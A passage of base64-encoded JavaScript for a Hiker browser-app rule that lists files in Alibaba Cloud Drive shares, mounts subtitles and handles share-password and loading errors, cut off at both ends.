nNlbGVjdCgoKSA9PiB7XFxuICAgICAgICAgICAgICAgIHNldEl0ZW0oXFxcImFsaXl1bl9vcmRlclxcXCIsIGlucHV0KTtcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+WIh+aNouaIkOWKn1xcXCI7XFxuICAgICAgICAgICAgfSksXFxuICAgICAgICAgICAgY29sX3R5cGU6IGZ1blN0eWxlLFxcbiAgICAgICAgICAgIHBpY191cmw6IFxcXCJodHRwczovL2hpa2VyZmFucy5jb20vaW1nL2FsaV9zb3J0LnN2Z1xcXCJcXG4gICAgICAgIH0sIHtcXG4gICAgICAgICAgICB0aXRsZTogZ2V0SXRlbShcXFwiYWxpeXVuX3BsYXlNb2RlXFxcIiwgXFxcIui9rOeggVxcXCIpLFxcbiAgICAgICAgICAgIHVybDogJChbXFxcIui9rOeggVxcXCIsIFxcXCLljp/nlLtcXFwiXSwgMiwgXFxcIuaSreaUvuaooeW8j1xcXCIpLnNlbGVjdCgoKSA9PiB7XFxuICAgICAgICAgICAgICAgIHNldEl0ZW0oXFxcImFsaXl1bl9wbGF5TW9kZVxcXCIsIGlucHV0KTtcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+WIh+aNouaIkOWKn1xcXCI7XFxuICAgICAgICAgICAgfSksXFxuICAgICAgICAgICAgY29sX3R5cGU6IGZ1blN0eWxlLFxcbiAgICAgICAgICAgIHBpY191cmw6IFxcXCJodHRwczovL2hpa2VyZmFucy5jb20vaW1nL2FsaV9wbGF5LnN2Z1xcXCJcXG4gICAgICAgIH0pO1xcbiAgICAgICAgaWYgKCFpc1NlYXJjaCkge1xcbiAgICAgICAgICAgIGl0ZW1zLnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuWKn+iDvVxcXCIsXFxuICAgICAgICAgICAgICAgIHVybDogJChbXFxcIui9rOWtmOS6keebmFxcXCIsIFxcXCLnmbvpmYbotKblj7dcXFwiLCBcXFwi5aSN5Yi25YiG5Lqr6ZO+5o6lXFxcIiwgXFxcIuafpeeci+aJi+WKqOaMgui9veWtl+W5lVxcXCIsIFxcXCLojrflj5blvLnluZXmkJzntKLop4TliJlcXFwiLCBcXFwi5om56YeP5oyC6L295pys5Zyw5by55bmVXFxcIl0sIDIsIFxcXCLmm7TlpJrlip/og71cXFwiKS5zZWxlY3QoKHNoYXJlSWQsIHNoYXJlUHdkLCBmaWxlSWQpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoaW5wdXQpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFxcXCLovazlrZjkupHnm5hcXFwiOlxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYHNtYXJ0ZHJpdmU6Ly9zaGFyZS9icm93c2U/c2hhcmVJZD0ke3NoYXJlSWR9JnNoYXJlUHdkPSR7c2hhcmVQd2R8fFxcXCJcXFwifWA7XFxuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcXFwi55m76ZmG6LSm5Y+3XFxcIjpcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL3BhZ2UvbG9naW4jbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFxcXCLlpI3liLbliIbkuqvpk77mjqVcXFwiOlxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcImNvcHk6Ly9odHRwczovL3d3dy5hbGl5dW5kcml2ZS5jb20vcy9cXFwiICsgc2hhcmVJZCArKGZpbGVJZD9cXFwiL2ZvbGRlci9cXFwiICsgZmlsZUlkOlxcXCJcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFxcXCLmibnph4/mjILovb3mnKzlnLDlvLnluZVcXFwiOlxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vcGFnZS9kbU1vdW50I25vSGlzdG9yeSMjbm9SZWNvcmRIaXN0b3J5I1xcXCI7XFxuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcXFwi5p+l55yL5omL5Yqo5oyC6L295a2X5bmVXFxcIjpcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHptID0gc3RvcmFnZTAuZ2V0TXlWYXIoXFxcIm1vdW50emltdVxcXCIsIHt9KTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHRpcCA9IHptLm5hbWUgPyBcXFwi5b2T5YmN5a2X5bmV5paH5Lu2XFxcXG5cXFwiICsgem0ubmFtZSArIFxcXCIuXFxcIiArIHptLmV4dCA6IFxcXCLov5jmnKrmiYvliqjmjILovb3lrZfluZVcXFwiO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25maXJtKHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiAn5omL5Yqo5oyC6L295a2X5bmVJyxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnQ6IHRpcCArIFxcXCJcXFxcbijngrnlh7vlj5bmtojlj6/ku6XmuIXpmaTmjILovb3lrZfluZUpXFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhbmNlbDogKCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFyTXlWYXIoXFxcIm1vdW50emltdVxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/lt7LmuIXpmaTmiYvliqjmjILovb3lrZfluZVcXFwiO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXFxcIuiOt+WPluW8ueW5leaQnOe0ouinhOWImVxcXCI6XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBydWxlID0ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXFxcImpzXFxcIjogSlNPTi5zdHJpbmdpZnkoXFxcImhpa2VyOi8vcGFnZS9sb2FkRG0/cnVsZT1cXFwiICsgTVlfUlVMRS50aXRsZStcXFwiJnRpdGxlPVxcXCIpK1xcXCIrZW5jb2RlVVJJQ29tcG9uZW50KHBsYXlkYXRhLnRpdGxlLnNwbGl0KCctJylbMF0pO1xcXCIsIFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXFxcIm5hbWVcXFwiOiBNWV9SVUxFLnRpdGxlICsgXFxcIuW8ueW5leaQnOe0olxcXCJcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJydWxlOi8vXFxcIiArIGJhc2U2NEVuY29kZShcXFwi77+lcHJvamVjdGlvbl9zY3JlZW7vv6VcXFwiICsgSlNPTi5zdHJpbmdpZnkocnVsZSkpO1xcbiAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICB9LCBzaGFyZUlkLCBzaGFyZVB3ZCwgZmlsZUlkKSxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJpY29uX3JvdW5kX3NtYWxsXzRcXFwiLFxcbiAgICAgICAgICAgICAgICBwaWNfdXJsOiBcXFwiaHR0cHM6Ly9oaWtlcmZhbnMuY29tL2ltZy9hbGlfZmlsZWludG8uc3ZnXFxcIixcXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgIH1cXG4gICAgICAgIGl0ZW1zLnB1c2goe1xcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwibGluZV9ibGFua1xcXCJcXG4gICAgICAgIH0pO1xcbiAgICB9XFxuICAgIGxldCByZXNjb2QgPSB7fTtcXG4gICAgbGV0IG1hcmtlciA9IE1ZX1BBUkFNUy5tYXJrZXI7ICAgIFxcbiAgICBpZiAoaXNTZWFyY2gpIHtcXG4gICAgICAgIHJlc2NvZCA9IGFsaVNoYXJlQXBpLmdldFNlYXJjaExpc3RGaWxlKHNlYXJjaEtleSwgbWFya2VyLCBvcmRlclswXSwgb3JkZXJbMV0pO1xcbiAgICB9IGVsc2Uge1xcbiAgICAgICAgcmVzY29kID0gYWxpU2hhcmVBcGkuZ2V0TGlzdEZpbGUoZmlsZUlkLCBtYXJrZXIsIG9yZGVyWzBdLCBvcmRlclsxXSk7XFxuICAgIH1cXG4gICAgaWYgKHJlc2NvZC5uZXh0X21hcmtlcikge1xcbiAgICAgICAgc2V0TWFya2VyKHJlc2NvZC5uZXh0X21hcmtlcik7XFxuICAgIH0gZWxzZSB7XFxuICAgICAgICBzZXRNYXJrZXIoKTtcXG4gICAgfVxcblxcbiAgICB2YXIgY29udHMgPSByZXNjb2QuaXRlbXM7XFxuICAgIC8v5a2X5bmV5Yy56YWN5YeG5aSHXFxuICAgIGxldCBzdWJFeHRzPVtcXFwidnR0XFxcIiwgXFxcInNydFxcXCIsIFxcXCJhc3NcXFwiXTtcXG4gICAgdmFyIHppbXVsaXN0ID0gW107XFxuICAgIGNvbnRzLmZvckVhY2goKGl0ZW0pID0+IHtcXG4gICAgICAgIGlmIChzdWJFeHRzLmluY2x1ZGVzKGl0ZW0uZmlsZV9leHRlbnNpb24gJiYgaXRlbS5maWxlX2V4dGVuc2lvbi50b0xvd2VyQ2FzZSgpKSkge1xcbiAgICAgICAgICAgIGxldCBuYW1lID0gaXRlbS5uYW1lLnJlcGxhY2UoJy4nICsgaXRlbS5maWxlX2V4dGVuc2lvbiwgJycpO1xcbiAgICAgICAgICAgIHppbXVsaXN0LnB1c2goe1xcbiAgICAgICAgICAgICAgICBleHQ6IGl0ZW0uZmlsZV9leHRlbnNpb24sXFxuICAgICAgICAgICAgICAgIGZpbGVfaWQ6IGl0ZW0uZmlsZV9pZCxcXG4gICAgICAgICAgICAgICAgbmFtZTogbmFtZVxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfVxcbiAgICB9KTtcXG4gICAgLy/lpITnkIblpLjpobXljLnphY3lrZfluZVcXG4gICAgLypcXG4gICAgbGV0IGhhc1N1YiA9IHppbXVsaXN0Lmxlbmd0aCA+IDA7XFxuICAgIGlmIChoYXNTdWImJnJlc2NvZC5uZXh0X21hcmtlcikge1xcbiAgICAgICAgaWYgKHppbXVsaXN0Lmxlbmd0aCA+IDQpIHtcXG4gICAgICAgICAgICBzZXRTdWJ0aXRsZUNhY2hlKHppbXVsaXN0LnNsaWNlKC00KSk7XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIHNldFN1YnRpdGxlQ2FjaGUoemltdWxpc3QpO1xcbiAgICAgICAgfVxcbiAgICB9XFxuICAgIGxldCBsYXN0SXRlbSA9IGNvbnRzLmF0KC0xKTtcXG4gICAgaWYgKGhhc1N1YiYmbGFzdEl0ZW0mJmxhc3RJdGVtLmNhdGVnb3J5ID09PSBcXFwidmlkZW9cXFwiKSB7XFxuICAgICAgICBzZXRWaWRlb0l0ZW1DYWNoZShjb250cy5zcGxpY2UoY29udHMubGVuZ3RoLTEsMSkpO1xcbiAgICB9XFxuICAgIGlmIChNWV9QQUdFID4gMSkge1xcbiAgICAgICAgbGV0IHN1YnRpdGxlQ2FjaGUgPSBNWV9QQVJBTVMuc3VidGl0bGVDYWNoZSB8fCBbXTtcXG4gICAgICAgIHppbXVsaXN0ID0gemltdWxpc3QuY29uY2F0KHN1YnRpdGxlQ2FjaGUpO1xcbiAgICAgICAgbGV0IHZpZGVvSXRlbUNhY2hlID0gTVlfUEFSQU1TLnZpZGVvSXRlbUNhY2hlIHx8IFtdO1xcbiAgICAgICAgY29udHMgPSB2aWRlb0l0ZW1DYWNoZS5jb25jYXQoY29udHMpO1xcbiAgICAgICAgc2V0U3VidGl0bGVDYWNoZSgpO1xcbiAgICAgICAgc2V0VmlkZW9JdGVtQ2FjaGUoKTtcXG4gICAgfSovXFxuICAgIC8v566A5L2T5LyY5YWIXFxuICAgIHppbXVsaXN0LnNvcnQoKGEsIGIpID0+IChiLm5hbWUuZW5kc1dpdGgoXFxcIi5zY1xcXCIpIHx8IGIubmFtZS5lbmRzV2l0aChcXFwiLmNoc1xcXCIpKSAtIChhLm5hbWUuZW5kc1dpdGgoXFxcIi5zY1xcXCIpIHx8IGEubmFtZS5lbmRzV2l0aChcXFwiLmNoc1xcXCIpKSk7XFxuICAgIC8vZW5kXFxuICAgIGxldCB0aXRsZUhlYWQgPSB7XFxuICAgICAgICB2aWRlbzogXFxcIvCfjqxcXFwiLFxcbiAgICAgICAgYXVkaW86IFxcXCLwn461XFxcIixcXG4gICAgICAgIGRvYzogXFxcIvCfk5FcXFwiLFxcbiAgICAgICAgaW1hZ2U6IFxcXCLwn5a8XFxcIixcXG4gICAgICAgIHppcDogXFxcIvCfk6ZcXFwiLFxcbiAgICAgICAgZm9sZGVyOiBcXFwi8J+TglxcXCJcXG4gICAgfTtcXG4gICAgbGV0IGZvbGRlclN0eWxlLCBmaWxlU3R5bGUsIGlzV2F0Y2hpbmcgPSBzdHlsZSA9PT0gXFxcIui/veWJp1xcXCI7XFxuICAgIGlmIChpc1dhdGNoaW5nKSB7XFxuICAgICAgICBmb2xkZXJTdHlsZSA9IFxcXCJhdmF0YXJcXFwiO1xcbiAgICAgICAgZmlsZVN0eWxlID0gXFxcIm1vdmllXzJcXFwiO1xcbiAgICB9IGVsc2Uge1xcbiAgICAgICAgZm9sZGVyU3R5bGUgPSBmaWxlU3R5bGUgPSBzdHlsZTtcXG4gICAgfVxcbiAgICBmb3IgKGxldCBpID0gMDsgaSA8IGNvbnRzLmxlbmd0aDsgaSsrKSB7XFxuICAgICAgICBsZXQgZmlsZUl0ZW0gPSBjb250c1tpXTtcXG4gICAgICAgIGxldCBjYXRlID0gZmlsZUl0ZW0uY2F0ZWdvcnk7XFxuICAgICAgICBsZXQgZGVzYyA9IGZvcm1hdERhdGUoZmlsZUl0ZW0udXBkYXRlZF9hdCk7XFxuICAgICAgICBsZXQgcGljX3VybCA9IGdldEljb24oZmlsZUl0ZW0uZmlsZV9leHRlbnNpb24sIGZpbGVJdGVtLnR5cGUpO1xcblxcbiAgICAgICAgaWYgKGZpbGVJdGVtLnR5cGUgPT09IFxcXCJmb2xkZXJcXFwiKSB7XFxuICAgICAgICAgICAgbGV0IHRpdGxlID0gKGZvbGRlclN0eWxlID09PSBcXFwidGV4dF8xXFxcIiA/IHRpdGxlSGVhZC5mb2xkZXIgOiBcXFwiXFxcIikgKyBmaWxlSXRlbS5uYW1lO1xcbiAgICAgICAgICAgIGl0ZW1zLnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogdGl0bGUsXFxuICAgICAgICAgICAgICAgIHVybDogJ2hpa2VyOi8vcGFnZS9hbGl5dW4/cGFnZT1meXBhZ2UnLFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogZm9sZGVyU3R5bGUsXFxuICAgICAgICAgICAgICAgIGRlc2M6IGZvcm1hdERhdGUoZmlsZUl0ZW0udXBkYXRlZF9hdCksXFxuICAgICAgICAgICAgICAgIHBpY191cmw6IHBpY191cmwsXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICBzaGFyZUlkOiBzaGFyZUlkLFxcbiAgICAgICAgICAgICAgICAgICAgc2hhcmVUb2tlbjogTVlfUEFSQU1TLnNoYXJlVG9rZW4sXFxuICAgICAgICAgICAgICAgICAgICBmaWxlSWQ6IGZpbGVJdGVtLmZpbGVfaWQsXFxuICAgICAgICAgICAgICAgICAgICBzaGFyZVB3ZDogc2hhcmVQd2QsXFxuICAgICAgICAgICAgICAgICAgICBwYWdlVGl0bGU6IGZpbGVJdGVtLm5hbWUsXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgbGV0IHN1YnRpdGxlLCBsb25nYywgY2xzO1xcbiAgICAgICAgICAgIGxldCB0aXRsZSA9IChmaWxlU3R5bGUgPT09IFxcXCJ0ZXh0XzFcXFwiID8gKHRpdGxlSGVhZFtjYXRlXSB8fCBcXFwi4p2TXFxcIikgOiBcXFwiXFxcIikgKyBmaWxlSXRlbS5uYW1lO1xcbiAgICAgICAgICAgIGxldCBuYW1lTm90RXh0ID0gZmlsZUl0ZW0ubmFtZS5yZXBsYWNlKCcuJyArIGZpbGVJdGVtLmZpbGVfZXh0ZW5zaW9uLCAnJyk7XFxuICAgICAgICAgICAgaWYgKHN1YkV4dHMuaW5jbHVkZXMoZmlsZUl0ZW0uZmlsZV9leHRlbnNpb24pKSB7XFxuICAgICAgICAgICAgICAgIGxvbmdjID0gW3tcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi5oyC6L295a2X5bmVXFxcIixcXG4gICAgICAgICAgICAgICAgICAgIGpzOiAkLnRvU3RyaW5nKCh6bSkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHN0b3JhZ2UwLnB1dE15VmFyKCdtb3VudHppbXUnLCB6bSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+aMgui9veWujOaIkO+8jOW9k+WJjeWtl+W5leaWh+S7tjogJyArIHptLm5hbWUgKyAnLicgKyB6bS5leHQ7XFxuICAgICAgICAgICAgICAgICAgICB9LCB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgZXh0OiBmaWxlSXRlbS5maWxlX2V4dGVuc2lvbixcXG4gICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkOiBmaWxlSXRlbS5maWxlX2lkLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWU6IG5hbWVOb3RFeHRcXG4gICAgICAgICAgICAgICAgICAgIH0pLFxcbiAgICAgICAgICAgICAgICB9XTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgaWYgKGNhdGUgPT09IFxcXCJ2aWRlb1xcXCIpIHtcXG4gICAgICAgICAgICAgICAgaWYgKHppbXVsaXN0Lmxlbmd0aCkge1xcbiAgICAgICAgICAgICAgICAgICAgc3VidGl0bGUgPSB6aW11bGlzdC5maW5kKHYgPT4gdi5uYW1lLmluY2x1ZGVzKG5hbWVOb3RFeHQpKTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBjbHMgPSBcXFwicGxheWxpc3RcXFwiO1xcbiAgICAgICAgICAgICAgICBwaWNfdXJsID0gZmlsZUl0ZW0udGh1bWJuYWlsIHx8IHBpY191cmw7XFxuICAgICAgICAgICAgfSBlbHNlIGlmIChpc1dhdGNoaW5nKSB7XFxuICAgICAgICAgICAgICAgIGNvbnRpbnVlO1xcbiAgICAgICAgICAgIH1cXG5cXG4gICAgICAgICAgICBpZiAoZmlsZVN0eWxlID09PSBcXFwidGV4dF8xXFxcIikge1xcbiAgICAgICAgICAgICAgICBkZXNjICs9IFxcXCJcXFxcdFxcXFx0XFxcIiArIGZvcm1hdFNpemUoZmlsZUl0ZW0uc2l6ZSk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGl0ZW1zLnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogdGl0bGUsXFxuICAgICAgICAgICAgICAgIHVybDogJCgpLmxhenlSdWxlKChzaGFyZUlkLCBzaGFyZVB3ZCwgc2hhcmVUb2tlbiwgZmlsZUlkLCBjYXRlLCBzdWJ0aXRsZSkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL2FsaWxhenlcXFwiKShzaGFyZUlkLCBzaGFyZVB3ZCwgc2hhcmVUb2tlbiwgZmlsZUlkLCBjYXRlLCBzdWJ0aXRsZSk7XFxuICAgICAgICAgICAgICAgIH0sIHNoYXJlSWQsIHNoYXJlUHdkLCBNWV9QQVJBTVMuc2hhcmVUb2tlbiwgZmlsZUl0ZW0uZmlsZV9pZCwgY2F0ZSwgc3VidGl0bGUpLFxcbiAgICAgICAgICAgICAgICBkZXNjOiBkZXNjLFxcbiAgICAgICAgICAgICAgICBwaWNfdXJsOiBwaWNfdXJsLFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgaWQ6IGZpbGVJdGVtLmZpbGVfaWQsXFxuICAgICAgICAgICAgICAgICAgICBsb25nQ2xpY2s6IGxvbmdjLFxcbiAgICAgICAgICAgICAgICAgICAgY2xzOiBjbHMsXFxuICAgICAgICAgICAgICAgICAgICAvL2luaGVyaXRUaXRsZTogZmFsc2UsXFxuICAgICAgICAgICAgICAgICAgICBwYWdlVGl0bGU6IGZpbGVJdGVtLm5hbWVcXG4gICAgICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IGZpbGVTdHlsZVxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfVxcbiAgICB9XFxuICAgIGlmIChjb250cy5sZW5ndGggPT09IDApIHtcXG4gICAgICAgIGl0ZW1zLnB1c2goe1xcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxuICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCIsXFxuICAgICAgICAgICAgdGl0bGU6IFxcXCLigJzigJzigJ3igJ1cXFwiICsgXFxcIn5+fuS7gOS5iOmDveayoeacieS6huWTpn5+flxcXCIuZm9udGNvbG9yKFxcXCJHcmF5XFxcIiksXFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlLFxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0pO1xcbiAgICB9XFxufVxcblxcbmxldCBpdGVtcyA9IFtdO1xcbnRyeSB7XFxuICAgIGlmIChNWV9QQUdFID4gMSAmJiAhTVlfUEFSQU1TLm1hcmtlcikge1xcbiAgICAgICAgaXRlbXMucHVzaCh7XFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIixcXG4gICAgICAgICAgICB1cmw6IFxcXCJoaWtlcjovL2VtcHR5XFxcIixcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuKAnOKAnOKAneKAnVxcXCIgKyBcXFwifn5+5LuA5LmI6YO95rKh5pyJ5LqG5ZOmfn5+XFxcIi5mb250Y29sb3IoXFxcIkdyYXlcXFwiKSxcXG4gICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2UsXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSk7XFxuICAgIH0gZWxzZSB7XFxuICAgICAgICBsb2FkKGl0ZW1zKTtcXG4gICAgfVxcbn0gY2F0Y2ggKGUpIHtcXG4gICAgaWYgKGUubmFtZSA9PT0gXFxcIkFsaUVycm9yXFxcIikge1xcbiAgICAgICAgaWYgKGUuY29kZSA9PT0gXFxcIkludmFsaWRSZXNvdXJjZS5TaGFyZVB3ZFxcXCIpIHtcXG4gICAgICAgICAgICBpdGVtcy5wdXNoKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLor7fovpPlhaXmj5Dlj5bnoIFcXFwiLFxcbiAgICAgICAgICAgICAgICBkZXNjOiBzaGFyZVB3ZCA/IFxcXCLigJzigJzmj5Dlj5bnoIHplJnor6/igJ3igJ1cXFwiIDogXFxcIlxcXCIsXFxuICAgICAgICAgICAgICAgIHVybDogJCgpLmlucHV0KChNWV9QQVJBTVMpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIHNldFBhZ2VQYXJhbXMoT2JqZWN0LmFzc2lnbih7fSwgTVlfUEFSQU1TLCB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgc2hhcmVQd2Q6IGlucHV0XFxuICAgICAgICAgICAgICAgICAgICB9KSk7XFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgICAgICB9LCBNWV9QQVJBTVMpLFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfY2VudGVyXzFcXFwiXFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIGlmIChlLnNpZ25pZmljYW5jZSA9PT0gMSkge1xcbiAgICAgICAgICAgICAgICBpdGVtcy5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi4oCc4oCc4oCd4oCdXFxcIiArIGUubWVzc2FnZS5iaWcoKS5iaWcoKS5mb250Y29sb3IoXFxcInJlZFxcXCIpLFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnLFxcbiAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICB9IGVsc2UgaWYgKGUuc2lnbmlmaWNhbmNlID09PSAzKSB7XFxuICAgICAgICAgICAgICAgIGl0ZW1zLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLigJzigJzigJ3igJ1cXFwiICsgZS5tZXNzYWdlLmJpZygpLmZvbnRjb2xvcihcXFwiZ3JlZW5cXFwiKSxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogXFxcImhpa2VyOi8vZW1wdHlcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJ1xcbiAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9XFxuXFxuICAgIH0gZWxzZSB7XFxuICAgICAgICBsb2coXFxcIuWIl+ihqOWKoOi9veWksei0pSNcXFxcbumUmeivr+S/oeaBrz5cXFwiICsgZS50b1N0cmluZygpICsgXFxcIlxcXFxu6ZSZ6K+v6KGMPlxcXCIgKyBlLmxpbmVOdW1iZXIpO1xcbiAgICAgICAgaXRlbXMucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6ICfmrKfmrKfvvIzmiqXplJnkuobjgILlnKjliLfmlrDlh6DmrKHvvJ/miJbogIXmm7TmjaLmlofku7blpLnjgIInLFxcbiAgICAgICAgICAgIHVybDogXFxcImhpa2VyOi8vZW1wdHlcXFwiLFxcbiAgICAgICAgICAgIGRlc2M6IGUudG9TdHJpbmcoKSxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnXFxuICAgICAgICB9KTtcXG4gICAgICAgIC8vdGhyb3cgZTtcXG4gICAgfVxcbn1cXG5zYXZlTXlQYUNhY2hlKCk7XFxuc2V0UmVzdWx0KGl0ZW1zKTtcIixcImdyb3VwXCI6XCIwMVwiLFwidWFcIjpcIm1vYmlsZVwiLFwicHJlUnVsZVwiOlwiXCIsXCJwYWdlc1wiOlwiW3tcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuinhOWImeWkhOeQhlxcXCIsXFxcInBhdGhcXFwiOlxcXCJkYXRhXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxubGV0IHJ1bGVzID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3J1bGVzXFxcXFxcXCIpO1xcXFxuXFxcXG4vL+W5tuWPkeinhOWImeaVsFxcXFxuXFxcXG5cXFxcbmZ1bmN0aW9uIGRvdWJsZVRyZWF0aW5nKG9wZW5Nb2RlLCBmaW5kQWxpVXJsLCB0aXRsZSkge1xcXFxuICAgIGxldCBhbGlVcmwgPSBpbnB1dDtcXFxcbiAgICBsZXQgc2hhcmVQd2Q7XFxcXG4gICAgaWYgKGZpbmRBbGlVcmwpIHtcXFxcbiAgICAgICAgbGV0IHJlc3VsdCA9IGZpbmRBbGlVcmwoYWxpVXJsKTtcXFxcbiAgICAgICAgaWYgKHR5cGVvZiByZXN1bHQgPT09IFxcXFxcXFwic3RyaW5nXFxcXFxcXCIpXFxcXG4gICAgICAgICAgICBhbGlVcmwgPSByZXN1bHQ7XFxcXG4gICAgICAgIGVsc2VcXFxcbiAgICAgICAgICAgIGFsaVVybCA9IHJlc3VsdC5hbGlVcmwsIHNoYXJlUHdkID0gcmVzdWx0LnNoYXJlUHdkO1xcXFxuICAgIH1cXFxcbiAgICBpZiAoYWxpVXJsLmluY2x1ZGVzKFxcXFxcXFwid3d3LmFsaXl1bmRyaXZlLmNvbS9zL1xcXFxcXFwiKSkge1xcXFxuICAgICAgICBpZiAob3Blbk1vZGUgPT09IFxcXFxcXFwi5pys5Zyw6L2s56CBXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9wYWdlL2FsaXl1bj9wYWdlPWZ5cGFnZSZydWxlPScgKyB0aXRsZSArICcmcmVhbHVybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGFsaVVybCkgKyBcXFxcXFxcIiZzaGFyZVB3ZD1cXFxcXFxcIiArIChzaGFyZVB3ZCB8fCBcXFxcXFx